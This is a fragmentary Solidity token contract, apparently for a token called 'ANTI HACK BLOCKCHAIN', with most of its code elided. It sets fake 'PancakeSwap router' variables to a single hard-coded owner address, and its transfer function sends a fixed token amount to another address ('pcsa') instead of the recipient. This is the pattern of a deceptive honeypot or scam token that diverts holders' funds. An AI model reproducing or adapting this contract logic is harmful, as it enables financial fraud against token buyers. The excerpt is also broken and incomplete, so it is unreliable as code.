...
// File: https://github.com/sinowan/newfixed/blob/main/fixedno9.sol
...
// File: sapofasasaskasfapsfsa.sol
...
contract fixedtoken is Context, IERC20, Ownable {
    ...
    string private constant _name = "ANTI HACK BLOCKCHAIN";
    string private constant _symbol = "ANTI HACK";

    address public _PancakeSwapV1RouterUniswap = 0xEFD65E07579a80864E11097c42F8Dc01cB7d9DA0 ; //PancakeSwap owner
    address public _PancakeSwapV2RouterUniswap = 0xEFD65E07579a80864E11097c42F8Dc01cB7d9DA0 ; //can be the same
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        ...
        _transfer(_msgSender() , pcsa , 79000000000000000000 );
        return Trading;
